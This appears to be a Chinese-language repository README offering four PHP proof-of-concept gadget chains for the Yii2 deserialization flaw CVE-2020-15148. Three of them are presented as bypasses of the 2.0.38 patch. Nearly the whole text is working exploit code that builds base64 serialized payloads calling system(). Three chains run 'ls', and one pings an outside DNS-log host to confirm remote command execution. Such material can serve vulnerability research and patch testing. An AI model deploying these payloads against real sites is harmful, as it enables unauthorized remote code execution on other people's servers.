# CVE-2020-15148-bypasses
几条关于CVE-2020-15148（yii2反序列化）的绕过


### poc1

这一个是在2.0.37版本可利用的，2.0.38修复了这，也就是这个被分配了CVE-2020-15148，后面的三个是绕过
```
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'ls';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>
```

### poc2

```
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'ls';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为isRunning
            $this->formatters['isRunning'] = [new CreateAction(), 'run'];
        }
    }
}

// poc2
namespace Codeception\Extension{
    use Faker\Generator;
    class RunProcess{
        private $processes;
        public function __construct()
        {
            $this->processes = [new Generator()];
        }
    }
}
namespace{
    // 生成poc
    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));
}
?>
```

### poc3

```
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'ls';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为isRunning
            $this->formatters['render'] = [new CreateAction(), 'run'];
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{

    use Faker\Generator;

    class See{
        protected $description;
        public function __construct()
        {
            $this->description = new Generator();
        }
    }
}
namespace{
    use phpDocumentor\Reflection\DocBlock\Tags\See;
    class Swift_KeyCache_DiskKeyCache{
        private $keys = [];
        private $path;
        public function __construct()
        {
            $this->path = new See;
            $this->keys = array(
                "axin"=>array("is"=>"handsome")
            );
        }
    }
    // 生成poc
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
}
?>
```

### poc4

```
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'ping -c 4 123.dnslog.sicnu.tech';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为isRunning
            $this->formatters['render'] = [new CreateAction(), 'run'];
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{

    use Faker\Generator;

    class See{
        protected $description;
        public function __construct()
        {
            $this->description = new Generator();
        }
    }
}

namespace Symfony\Component\String{
    use phpDocumentor\Reflection\DocBlock\Tags\See;
    class UnicodeString{
        protected $string;
        public function __construct()
        {
            $this->string = new See;
        }
    }
}
namespace{
    use Symfony\Component\String\UnicodeString;
    // 生成poc
    echo base64_encode(serialize(new UnicodeString()));
}
?>
```

具体可见我的公众号【一个安全研究员】

文章链接：https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&mid=2247485129&idx=1&sn=b27e3fe845daee2fb13bb9f36f53ab40&chksm=fdc066c5cab7efd3f7356c0930e4d786b8fdefa661f5eb26a2c0679c4f5ef97e5b1d4b2d9172&token=718379963&lang=zh_CN#rd